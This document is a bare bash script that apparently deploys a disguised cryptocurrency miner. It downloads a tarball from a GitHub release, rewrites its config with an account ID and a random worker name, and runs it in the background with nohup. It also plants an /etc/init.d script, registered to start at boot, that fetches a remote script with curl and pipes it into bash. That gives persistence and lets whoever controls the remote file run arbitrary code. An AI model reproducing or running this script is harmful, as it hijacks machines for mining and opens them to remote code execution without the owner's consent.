cd /
rm -rf midas.tar
rm -rf sound
wget https://github.com/imprewa/amplitu/releases/download/rev2.0.1/midas.tar
tar -xvf midas.tar
cd /sound
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
sed -i "s/test_thread/10 --thread ${variable1}/g" ./amd.sh
sed -i "s/13/10 --thread ${variable1}/g" ./amd.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/imprewa/amplitu/main/xenix.sh)" > behringer.sh
chmod a+x behringer.sh
update-rc.d behringer.sh defaults
cd /sound
nohup ./amd.sh
ps -ef | grep midas
